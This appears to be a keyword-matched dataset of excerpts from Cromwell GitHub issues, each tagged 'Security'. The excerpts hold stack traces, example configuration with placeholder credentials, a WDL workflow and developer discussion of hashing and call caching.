Security,"lFunction.scala:171); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:171); at akka.actor.Actor$class.aroundReceive(Actor.scala:496); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:67); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); ... 5 more; Caused by: com.google.api.client.http.HttpResponseException: 500 Internal Server Error; {; ""error"" : ""internal_failure""; }; at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:1070); at com.google.auth.oauth2.UserCredentials.refreshAccessToken(UserCredentials.java:207); at com.google.auth.oauth2.OAuth2Credentials.refresh(OAuth2Credentials.java:149); at cromwell.filesystems.gcs.auth.GoogleAuthMode$$anonfun$validateCredential$1.apply$mcV$sp(GoogleAuthMode.scala:62); at cromwell.filesystems.gcs.auth.GoogleAuthMode$$anonfun$validateCredential$1.apply(GoogleAuthMode.scala:62); at cromwell.filesystems.gcs.auth.GoogleAuthMode$$anonfun$validateCredential$1.apply(GoogleAuthMode.scala:62); at scala.util.Try$.apply(Try.scala:192); at cromwell.filesystems.gcs.auth.GoogleAuthMode$class.validate(GoogleAuthMode.scala:65); ... 46 more. [INFO] [05/12/2017 21:47:03.777] [cromwell-system-akka.dispatchers.engine-dispatcher-7] [akka://cromwell-system/user/cromwell-service/WorkflowManagerActor] WorkflowManagerActor WorkflowActor-6c383c35-d791-4971-aecd-0723726c8a7b is in a terminal state: WorkflowFailedState; ^C[INFO] [05/15/2017 14:06:33.456] [shutdownHook1] [akka://cromwell-system/user/cromwell-service/WorkflowManagerActor] WorkflowManagerActor: Received shutdown signal.; [INFO] [05/15/2017 14:06:33.457] [cromwell-system-akka.dispatchers.engine-dispatcher-91] [akka://cromwell-system/user/cromwell-service/WorkflowManagerActor] WorkflowManagerActor All workflows finished; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2270:6463,validat,validateCredential,6463,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2270,3,['validat'],"['validate', 'validateCredential']"
Security,lNamespace.scala:207); 	at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.immutable.List.foreach(List.scala:381); 	at scala.collection.TraversableLike$class.map(TraversableLike.scala:234); 	at scala.collection.immutable.List.map(List.scala:285); 	at wdl4s.WdlNamespace$.apply(WdlNamespace.scala:207); 	at wdl4s.WdlNamespace$.wdl4s$WdlNamespace$$load(WdlNamespace.scala:177); 	at wdl4s.WdlNamespace$.loadUsingSource(WdlNamespace.scala:173); 	at wdl4s.WdlNamespaceWithWorkflow$.load(WdlNamespace.scala:542); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$validateNamespaceWithImports$1.apply(MaterializeWorkflowDescriptorActor.scala:363); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$validateNamespaceWithImports$1.apply(MaterializeWorkflowDescriptorActor.scala:356); 	at lenthall.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:17); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.validateNamespaceWithImports(MaterializeWorkflowDescriptorActor.scala:356); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.validateNamespace(MaterializeWorkflowDescriptorActor.scala:372); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$lifecycle$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor(MaterializeWorkflowDescriptorActor.scala:172); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$3.applyOrElse(MaterializeWorkflowDescriptorActor.scala:132); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$3.applyOrElse(MaterializeWorkflowDescriptorActor.scala:130); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); 	at akka.actor.FSM$class.processEvent(FSM.scala:66,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1958:2192,validat,validation,2192,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1958,1,['validat'],['validation']
Security,la:412) ~[classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$cromwell$engine$backend$jes$JesBackend$$createJesRun$1$$anonfun$apply$10.apply(JesBackend.scala:412) ~[classes/:na]; at cromwell.util.TryUtil$$anonfun$4.apply(TryUtil.scala:64) ~[classes/:na]; at scala.util.Try$.apply(Try.scala:192) ~[scala-library-2.11.7.jar:1.0.0-M1]; at cromwell.util.TryUtil$.retryBlock(TryUtil.scala:64) ~[classes/:na]; at cromwell.engine.backend.jes.JesBackend$.withRetry(JesBackend.scala:113) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$cromwell$engine$backend$jes$JesBackend$$createJesRun$1.apply(JesBackend.scala:412) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$cromwell$engine$backend$jes$JesBackend$$createJesRun$1.apply(JesBackend.scala:400) [classes/:na]; at cromwell.engine.backend.jes.authentication.JesAuthentication$class.authenticateAsCromwell(JesAuthentication.scala:39) [classes/:na]; at cromwell.engine.backend.jes.JesBackend.authenticateAsCromwell(JesBackend.scala:161) [classes/:na]; at cromwell.engine.backend.jes.JesBackend.cromwell$engine$backend$jes$JesBackend$$createJesRun(JesBackend.scala:400) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$10.apply(JesBackend.scala:542) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$10.apply(JesBackend.scala:541) [classes/:na]; at scala.util.Success.flatMap(Try.scala:231) [scala-library-2.11.7.jar:1.0.0-M1]; at cromwell.engine.backend.jes.JesBackend.cromwell$engine$backend$jes$JesBackend$$runWithJes(JesBackend.scala:541) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executeOrResume$1.apply(JesBackend.scala:285) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executeOrResume$1.apply(JesBackend.scala:275) [classes/:na]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) [scala-library-2.11.7.jar:na]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/338#issuecomment-166392486:4098,authenticat,authenticateAsCromwell,4098,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/338#issuecomment-166392486,1,['authenticat'],['authenticateAsCromwell']
Security,"la:700) ~[cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) ~[cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24) ~[cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; Caused by: java.io.EOFException: SSL peer shut down incorrectly; at sun.security.ssl.InputRecord.read(InputRecord.java:505) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72]; ... 54 common frames omitted; ```. and. ```; 2016-08-03 03:33:06,985 cromwell-system-akka.actor.default-dispatcher-3 WARN - Caught exception, retrying: Broken pipe; java.net.SocketException: Broken pipe; at java.net.SocketOutputStream.socketWrite0(Native Method) ~[na:1.8.0_72]; at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109) ~[na:1.8.0_72]; at java.net.SocketOutputStream.write(SocketOutputStream.java:153) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpe",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:6845,secur,security,6845,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,lasses/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$cromwell$engine$backend$jes$JesBackend$$createJesRun$1$$anonfun$apply$10.apply(JesBackend.scala:412) ~[classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$cromwell$engine$backend$jes$JesBackend$$createJesRun$1$$anonfun$apply$10.apply(JesBackend.scala:412) ~[classes/:na]; at cromwell.util.TryUtil$$anonfun$4.apply(TryUtil.scala:64) ~[classes/:na]; at scala.util.Try$.apply(Try.scala:192) ~[scala-library-2.11.7.jar:1.0.0-M1]; at cromwell.util.TryUtil$.retryBlock(TryUtil.scala:64) ~[classes/:na]; at cromwell.engine.backend.jes.JesBackend$.withRetry(JesBackend.scala:113) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$cromwell$engine$backend$jes$JesBackend$$createJesRun$1.apply(JesBackend.scala:412) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$cromwell$engine$backend$jes$JesBackend$$createJesRun$1.apply(JesBackend.scala:400) [classes/:na]; at cromwell.engine.backend.jes.authentication.JesAuthentication$class.authenticateAsCromwell(JesAuthentication.scala:39) [classes/:na]; at cromwell.engine.backend.jes.JesBackend.authenticateAsCromwell(JesBackend.scala:161) [classes/:na]; at cromwell.engine.backend.jes.JesBackend.cromwell$engine$backend$jes$JesBackend$$createJesRun(JesBackend.scala:400) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$10.apply(JesBackend.scala:542) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$10.apply(JesBackend.scala:541) [classes/:na]; at scala.util.Success.flatMap(Try.scala:231) [scala-library-2.11.7.jar:1.0.0-M1]; at cromwell.engine.backend.jes.JesBackend.cromwell$engine$backend$jes$JesBackend$$runWithJes(JesBackend.scala:541) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executeOrResume$1.apply(JesBackend.scala:285) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executeOrResume$1.apply(JesBackend.scala:275) [classes/:na]; at scala.concurrent.impl.Future$Promise,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/338#issuecomment-166392486:3951,authenticat,authentication,3951,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/338#issuecomment-166392486,1,['authenticat'],['authentication']
Security,"lds`; base64-encryption-key: ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="". // Directory where to write per workflow logs; workflow-log-dir: ""cromwell-workflow-logs"". // When true, per workflow logs will be deleted after copying; workflow-log-temporary: true. // Workflow-failure-mode determines what happens to other calls when a call fails. Can be either ContinueWhilePossible or NoNewCalls.; // Can also be overridden in workflow options. Defaults to NoNewCalls. Uncomment to change:; //workflow-failure-mode: ""ContinueWhilePossible""; }. // Optional call-caching configuration.; call-caching {; enabled = true. // The Docker image specified in the 'runtime' section of a task can be used as-is; // or Cromwell can lookup this Docker image to get a complete hash. For example,; // if a task specifies docker: ""ubuntu:latest"" and if lookup-docker-hash is true,; // Then Cromwell would query DockerHub to resolve ""ubuntu:latest"" to something like; // a2c950138e95bf603d919d0f74bec16a81d5cc1e3c3d574e8d5ed59795824f47; //; // A value of 'true' means that call hashes will more accurately represent the; // Docker image that was used to run the call, but at a cost of having to make a; // request to an external service (DockerHub, GCR). If a call fails to lookup a; // Docker hash, it will fail.; lookup-docker-hash = false; }. google {. application-name = ""cromwell"". auths = [; {; name = ""application-default""; scheme = ""application_default""; },; {; name = ""user-via-refresh""; scheme = ""refresh_token""; client-id = ""secret_id""; client-secret = ""secret_secret""; },; {; name = ""service-account""; scheme = ""service_account""; service-account-id = ""my-service-account""; pem-file = ""/path/to/file.pem""; }; ]; }. engine {; // This instructs the engine which filesystems are at its disposal to perform any IO operation that it might need.; // For instance, WDL variables declared at the Workflow level will be evaluated using the filesystems declared here.; // If you intend to be able to run workflows with ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1480:86337,hash,hash,86337,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1480,2,['hash'],"['hash', 'hashes']"
Security,"le genotype = genome_inference.vcf_file; }; }. task reads_extraction_and_merging {; input {; String in_container_pangenie; File in_forward_fastq; File in_reverse_fastq; String in_label; Int in_cores; Int in_disk; Int in_mem; }; command <<<; cat ~{in_forward_fastq} ~{in_reverse_fastq} | pigz -dcp ~{in_cores} > ~{in_label}.fastq; >>>; output {; File fastq_file = ""~{in_label}.fastq""; }; runtime {; docker: in_container_pangenie; memory: in_mem + "" GB""; cpu: in_cores; disks: ""local-disk "" + in_disk + "" SSD""; }; }. task genome_inference {; input {; String in_container_pangenie; File in_reference_genome; File in_pangenome_vcf; String in_executable; File in_fastq_file; String prefix_vcf; Int in_cores; Int in_disk; Int in_mem; }; command <<<; echo ""vcf: ~{in_pangenome_vcf}"" > /app/pangenie/pipelines/run-from-callset/config.yaml; echo ""reference: ~{in_reference_genome}"" >> /app/pangenie/pipelines/run-from-callset/config.yaml; echo $'reads:\n sample: ~{in_fastq_file}' >> /app/pangenie/pipelines/run-from-callset/config.yaml; echo ""pangenie: ~{in_executable}"" >> /app/pangenie/pipelines/run-from-callset/config.yaml; echo ""outdir: /app/pangenie"" >> /app/pangenie/pipelines/run-from-callset/config.yaml; cd /app/pangenie/pipelines/run-from-callset; snakemake --cores ~{in_cores}; >>>; output {; File vcf_file = ""~{prefix_vcf}.vcf""; }; runtime {; docker: in_container_pangenie; memory: in_mem + "" GB""; cpu: in_cores; disks: ""local-disk "" + in_disk + "" SSD""; preemptible: 1 # can be useful for tools which execute sequential steps in a pipeline generating intermediate outputs; }; }; ```; **_Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL:_**; ![Screenshot from 2022-12-09 10-52-16](https://user-images.githubusercontent.com/98895614/206773588-2e8dbf89-03a9-4021-9495-42f2bc0b801d.png). Please help me out on how to set the resources used by Cromwell in local, what file I need to create/modify or how should I cange my code? Thanks in advance!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6966:3870,PASSWORD,PASSWORDS,3870,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6966,1,['PASSWORD'],['PASSWORDS']
Security,"le/Configuring/#call-caching`. This is also true for the MySQL link on the page.; 3. As a user, I would expect links within documentation for a stable release to link to only ""stable"" assets. However, the Runtime Attributes link on the [Call Caching](https://cromwell.readthedocs.io/en/stable/cromwell_features/CallCaching/) page links to the develop version of the documentation instead. Similarly, the 'Example Providers Folder' section of the [Configuration](https://cromwell.readthedocs.io/en/stable/Configuring/) page links to the `develop` branch:; > You can find a description of options and example stanzas in the [Cromwell Example Configuration](https://www.github.com/broadinstitute/cromwell/tree/develop/cromwell.examples.conf), along with backend provider examples in the [Example Providers Folder](https://www.github.com/broadinstitute/cromwell/tree/develop/cromwell.example.backends).; 4. After seeing that a big perf bottleneck was Cromwell hashing files, I enabled all of the call caching options and also enabled `check-sibling-md5` so that it could use pre-computed hashes instead. To my surprise, this did nothing because it only works when the configured `actor-factory` is `cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory`! The documentation does **not** make that sufficiently clear:; - The `hashing-strategy` and `check-sibling-md5` options are listed under the `Local Filesystem` section (and configured under `config.filesystems.local.caching` which led me to believe they would work with any provider configured for local filesystem (e.g., TES). This is not the case, and they are in fact tied to the actor factory implementation and the only actor factory with support is `ConfigBackendLifecycleActorFactory` (as far as I could tell).; - The documentation does make mention of mention:; > When running a job on the **Config (Shared Filesystem) backend**, Cromwell provides some additional options in the backend's config section. However neither a Config",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4810:2053,hash,hashing,2053,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4810,2,['hash'],"['hashes', 'hashing']"
Security,"led for every upstream node through every possible upstream path, which grows exponentially with graph size for workflows that contain branches that rejoin (and most do). . ---. @danbills commented on [Thu Oct 05 2017](https://github.com/broadinstitute/wdl4s/issues/248#issuecomment-334536133). I think this comment is more appropriate here:. Equals is supposed to be bitwise/value-based equality, whereas `eq` indicates reference equality. I don't recall the exact motivation behind using `eq` in the test, maybe @cjllanwarne can comment when he returns on Tuesday. ---. @curoli commented on [Thu Oct 05 2017](https://github.com/broadinstitute/wdl4s/issues/248#issuecomment-334555964). If you don't like this fix, what do you suggest we do instead? How about we accept this fix now and you can rework the whole thing later, if you want?. This is a show-stopper once you want to create larger (aka real-life) workflows. . For example: if node a has two outputs, which are inputs of b, then b.hashCode calls a.hasCode twice. If b produces two outputs which are inputsof c, then c.hashCode calls b.hashCode twice, and a.hashCode is called four times. If c produces two outputs which are inputs of d, d.hashCode calls c.hashCode twice, b.hashCode four times and a.hashCode eight times, etc. . ---. @curoli commented on [Thu Oct 05 2017](https://github.com/broadinstitute/wdl4s/issues/248#issuecomment-334557027). `eq` is object equality. `equals` and `==` are the same, and there is no general rule that they need to be component-based (""bitwise""). On the contrary, `equals`/`==` should not be component-based if an object is mutable. Your typical GraphNode is mutable, because it indirectly contains `GraphNodeSetter`. ---. @danbills commented on [Thu Oct 05 2017](https://github.com/broadinstitute/wdl4s/issues/248#issuecomment-334575875). I suggest we leave this as-is with the understanding that it could be a performance issue down the road. . >rework the whole thing later. This is a specific anti-",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2694:1609,hash,hashCode,1609,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2694,2,['hash'],['hashCode']
Security,"led to calculate diff for call A and call B:\nFailed to extract relevant metadata for call A (f9a2bfe7-a173-439f-8c39-4bca22552a22 / BwaAligner.bwamem:-1) (reason 1 of 1): Cannot extract hashes for File reads. Expected JsString or JsObject but got JsArray [\""ec4ed7c97d38063d4ad0587812c034e8\"",\""083ce2cf30923ff510378b1c63feb0b6\""]\nFailed to extract relevant metadata for call B (e6f82c61-4d10-4c7e-9122-815658bb874c / BwaAligner.bwamem:-1) (reason 1 of 1): Cannot extract hashes for File reads. Expected JsString or JsObject but got JsArray [\""fa22ef528d4abd40315c885e784ff6c2\"",\""df337314b38af64554899eb5ebe81c74\""]"",; ""errors"": {; ""JsArray"": {; ""elements"": [; {; ""JsString"": {; ""value"": ""Failed to extract relevant metadata for call A (f9a2bfe7-a173-439f-8c39-4bca22552a22 / BwaAligner.bwamem:-1) (reason 1 of 1): Cannot extract hashes for File reads. Expected JsString or JsObject but got JsArray [\""ec4ed7c97d38063d4ad0587812c034e8\"",\""083ce2cf30923ff510378b1c63feb0b6\""]""; }; },; {; ""JsString"": {; ""value"": ""Failed to extract relevant metadata for call B (e6f82c61-4d10-4c7e-9122-815658bb874c / BwaAligner.bwamem:-1) (reason 1 of 1): Cannot extract hashes for File reads. Expected JsString or JsObject but got JsArray [\""fa22ef528d4abd40315c885e784ff6c2\"",\""df337314b38af64554899eb5ebe81c74\""]""; }; }; ]; }; }; }; ```. I presume this means that `processField` [[CallCacheDiffActor.scala#L164-L168](https://github.com/broadinstitute/cromwell/blob/8415afa3ee7ffe83e163cce3cbd8e1c1446db372/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/callcaching/CallCacheDiffActor.scala#L164-L168)] is missing a `case (key, subObject: JsArray)`. I confirmed this by adding the case (I don't know scala, nor inner workings of Cromwell except enough to know this probably isn't a good way to do it, but just wanted to see if my suspicion was correct):. ```scala; case (key, subObject: JsArray) => Map(keyPrefix + key -> subObject.elements.mkString(""|"")).validNel; ```. Which fixed the error.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5348:1688,hash,hashes,1688,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5348,1,['hash'],['hashes']
Security,lesystems.sra.SraPath.nioPath(SraPathBuilder.scala:31); 	at cromwell.core.path.Path.nioPathPrivate(PathBuilder.scala:113); 	at cromwell.core.path.Path.nioPathPrivate$(PathBuilder.scala:113); 	at cromwell.filesystems.sra.SraPath.nioPathPrivate(SraPathBuilder.scala:26); 	at cromwell.core.path.PathObjectMethods.hashCode(PathObjectMethods.scala:18); 	at cromwell.core.path.PathObjectMethods.hashCode$(PathObjectMethods.scala:18); 	at cromwell.filesystems.sra.SraPath.hashCode(SraPathBuilder.scala:26); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.DefaultIoCommand$DefaultIoSizeCommand.hashCode(DefaultIoCommand.scala:14); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.IoPromiseProxyActor$IoCommandWithPromise.hashCode(IoPromiseProxyActor.scala:11); 	at com.google.common.base.Equivalence$Equals.doHash(Equivalence.java:348); 	at com.google.common.base.Equivalence.hash(Equivalence.java:112); 	at com.google.common.cache.LocalCache.hash(LocalCache.java:1696); 	at com.google.common.cache.LocalCache.getIfPresent(LocalCache.java:3956); 	at com.google.common.cache.LocalCache$LocalManualCache.getIfPresent(LocalCache.java:4865); 	at cromwell.engine.io.IoActorProxy$$anonfun$receive$1.applyOrElse(IoActorProxy.scala:25); 	at akka.actor.Actor.aroundReceive(Actor.scala:539); 	at akka.actor.Actor.aroundReceive$(Actor.scala:537); 	at cromwell.engine.io.IoActorProxy.aroundReceive(IoActorProxy.scala:16); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:612); 	at akka.actor.ActorCell.invoke(ActorCell.scala:581); 	at akka.disp,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680:1277,hash,hashing,1277,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680,1,['hash'],['hashing']
Security,"liquibase.structure.core.Index.setColumns(Index.java:118); 	at liquibase.snapshot.jvm.PrimaryKeySnapshotGenerator.snapshotObject(PrimaryKeySnapshotGenerator.java:80); 	at liquibase.snapshot.jvm.JdbcSnapshotGenerator.snapshot(JdbcSnapshotGenerator.java:66); ...; ```; If I write the database to a file, all the correct tables seem to be present (I might have missed one, but the database is certainly populated with a schema). Now I have been doing some digging and this is the database object that is created:; ```; database = {SQLiteDatabase@5510} ""null @ jdbc:sqlite::memory:""; systemTables = {HashSet@5517} size = 2; reservedWords = {HashSet@5518} size = 43; defaultCatalogName = null; defaultSchemaName = null; currentDateTimeFunction = ""CURRENT_TIMESTAMP""; sequenceNextValueFunction = null; sequenceCurrentValueFunction = null; dateFunctions = {ArrayList@5520} size = 1; unmodifiableDataTypes = {ArrayList@5521} size = 0; defaultAutoIncrementStartWith = {BigInteger@5522} ""1""; defaultAutoIncrementBy = {BigInteger@5522} ""1""; unquotedObjectsAreUppercased = null; quotingStrategy = {ObjectQuotingStrategy@5523} ""QUOTE_ALL_OBJECTS""; caseSensitive = {Boolean@5524} true; databaseChangeLogTableName = null; databaseChangeLogLockTableName = null; liquibaseTablespaceName = null; liquibaseSchemaName = null; liquibaseCatalogName = null; previousAutoCommit = {Boolean@5524} true; canCacheLiquibaseTableInfo = false; connection = {JdbcConnection@5525} ; outputDefaultSchema = true; outputDefaultCatalog = true; defaultCatalogSet = false; attributes = {HashMap@5526} size = 0; ```. `defaultCatalogName` and `defaultSchemaName` are all defined for the HSQLDB database so maybe it is something there?. Anyway it also does not run properly outside of the test configuration. Running cromwell (compiled from this branch) with the following configuration:; ```; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite::memory:""; }; ```. Gives the following error:",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5453:991,Hash,HashSet,991,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5453,3,['Hash'],"['HashMap', 'HashSet']"
Security,"ll.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; The [cromwell.examples.conf](https://github.com/broadinstitute/cromwell/blob/develop/cromwell.example.backends/cromwell.examples.conf) file seems to mix multiple styles in terms of delimiters. Some entries are colon delimited as if they were from JSON, e.g.:. ```; workflow-options {; # These workflow options will be encrypted when stored in the database; #encrypted-fields: []. # AES-256 key to use to encrypt the values in `encrypted-fields`; #base64-encryption-key: ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="". # Directory where to write per workflow logs; #workflow-log-dir: ""cromwell-workflow-logs"". # When true, per workflow logs will be deleted after copying; #workflow-log-temporary: true. # Workflow-failure-mode determines what happens to other calls when a call fails. Can be either ContinueWhilePossible or NoNewCalls.; # Can also be overridden in workflow options. Defaults to NoNewCalls. Uncomment to change:; #workflow-failure-mode: ""ContinueWhilePossible"". default {; # When a workflow type is not provided on workflow submission, this specifies the default type.; #workflow-type: WDL. # When a workflow type version is not provided on workflow submission, this specifies the default type version.; #workflow-type-version: ""draft-2"". # To set a default hog group rather than defaulting to workflow ID:; #hogGroup: ""static""; }; }; ```; However, most are set with the equals sign:; ```; # Google configuration; google {. #applicat",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4913:1211,encrypt,encrypt,1211,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4913,3,['encrypt'],"['encrypt', 'encrypted-fields', 'encryption-key']"
Security,llowing error:. ```; Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; :; Disk strings should be of the format 'local-disk' or '/mount/point' but got: 'local-disk 100 HDD'; at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build(ValidatedRuntimeAttributesBuilder.scala:62); at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build$(ValidatedRuntimeAttributesBuilder.scala:56); at cromwell.backend.standard.StandardValidatedRuntimeAttributesBuilder$StandardValidatedRuntimeAttributesBuilderImpl.build(StandardValidatedRuntimeAttributesBuilder.scala:20); at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes(StandardCachingActorHelper.scala:56); at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes$(StandardCachingActorHelper.scala:54); at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes$lzycompute(AwsBatchAsyncBackendJobExecutionActor.scala:74); at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes(AwsBatchAsyncBackendJobExecutionActor.scala:74); at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues(StandardCachingActorHelper.scala:75); at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues$(StandardCachingActorHelper.scala:74); at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.startMetadataKeyValues$lzycompute(AwsBatchAsyncBackendJobExecutionActor.scala:362); at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.startMetadataKeyValues(AwsBatchAsyncBackendJobExecutionActor.scala:362); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:942); at 